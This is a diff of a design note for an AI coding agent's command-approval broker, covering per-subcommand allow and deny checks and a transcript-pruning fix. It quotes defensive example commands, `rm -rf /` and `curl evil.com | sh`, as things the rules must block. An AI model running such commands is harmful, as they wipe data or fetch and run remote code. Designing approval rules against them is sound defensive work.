@@ -130,12 +130,14 @@ While technically successful in delivering working code with 100% test pass rate
 - **Wildcard Matching (`cargo fmt *`):** Enhanced `matches_command_pattern` so that patterns with trailing wildcards (e.g. `cargo fmt *`) cleanly match both bare invocations (`cargo fmt`) and argument forms (`cargo fmt --all`, `cargo fmt -- --check`).
 - **Compound Command Security:** Implemented `split_compound_commands` in `src-tauri/src/approval_broker.rs`. When a command string contains chain or pipe operators (`&&`, `||`, `;`, `|`):
   - Every subcommand is parsed individually (respecting single and double quotes).
-  - Every subcommand must independently match an allowed rule (`matches_allow_single`).
-  - If *any* subcommand fails to match or triggers a reject rule (e.g. `cargo fmt && rm -rf /` or `cargo fmt ; curl evil.com | sh`), the entire command is blocked from auto-approval.
+  - In Ask mode, every subcommand must independently match an allowed rule (`matches_allow_single`) and none may hit a built-in reject pattern or user deny rule (`is_command_rejected`), or the entire command is blocked from auto-approval.
+  - In Auto mode, user deny rules are evaluated per subcommand (`matches_user_reject`), so a denied subcommand cannot hide behind an allowed one and still runs past the prompt-free path (e.g. `cargo fmt && rm -rf /` still prompts when `rm *` is denied).
 
 ### 3. Transcript Turn Alignment & Context-Pruning Fix — *Implemented*
 - **Root Cause Identified:** `ConversationStore` caps LLM history at 50 messages / 64 KB (`prune_history_for_storage`). In long, high-tool sessions (like Pockets with 82 edits), earlier turns were drained from model history. When Turn 2 finished, `successful_turn_persistence` blindly recomputed `display_transcript` from the pruned model history, completely erasing Turn 1's user prompt and leaving an orphaned tool block at index 0.
-- **Fix:** Implemented `merge_display_transcripts` in `src-tauri/src/session_turn.rs` and updated `successful_turn_persistence` to accept `existing_display_transcript`. The persistent transcript now preserves all historical user turns across context pruning, filtering out orphaned residue.
+- **Fix:** Implemented `merge_display_transcripts` in `src-tauri/src/session_turn.rs`, called from the turn-persistence path with the previously persisted transcript. The merge aligns the rebuilt suffix *positionally* (the rebuild's last user entry is the just-completed prompt, so earlier entries re-cover exactly the last N persisted turns) rather than by matching prompt text — identical repeated prompts therefore cannot merge wrongly. Turns that failed before reaching model history (`error`/`controlled_stop` rows) are display-only and survive in the transcript.
+- **Item-0 invariant:** `build_display_transcript` now drops entries preceding the first user message, so transcripts always open on the initiating user turn even when pruned history begins mid-turn.
+- **Fork path:** `run_session_message_action` now slices the persisted transcript via `transcript_through_response` (`src-tauri/src/session_actions.rs`) instead of rebuilding from truncated model history, preserving pruned turns in the forked copy.
 
 ### 4. Desktop GUI Testing Strategy for Pockets (GPUI)
 - **Headless Test Context (`TestAppContext`):** GPUI supports headless test contexts via `gpui::TestAppContext` to instantiate the application, create views, dispatch keyboard/click events (`cx.dispatch_action`), and verify state changes without a physical display.
